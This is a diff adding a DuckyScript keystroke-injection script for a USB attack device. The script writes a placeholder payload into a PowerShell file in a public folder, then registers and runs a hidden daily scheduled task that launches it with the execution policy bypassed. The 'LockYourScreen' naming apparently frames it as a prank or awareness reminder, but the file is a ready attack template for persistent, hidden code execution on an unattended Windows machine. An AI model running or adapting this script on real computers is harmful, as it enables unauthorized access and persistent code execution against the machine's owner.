@@ -1,0 +1,25 @@
+DELAY 1000
+GUI r
+DELAY 100
+STRING notepad.exe
+ENTER
+DELAY 500
+STRING <PAYLOAD>
+CTRL s
+DELAY 100
+STRING C:\Users\Public\Pictures\LockYourScreen.ps1
+ENTER
+DELAY 500
+ALT F4
+
+GUI r
+DELAY 100
+STRING cmd.exe
+ENTER
+DELAY 500
+STRING schtasks /create /tn "PleaseLockYourScreen" /SC DAILY /st 09:00:00 /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command '& C:\Users\Public\Pictures\LockYourScreen.ps1'"
+ENTER
+STRING schtasks /Run /TN "PleaseLockYourScreen"
+ENTER
+STRING exit
+ENTER
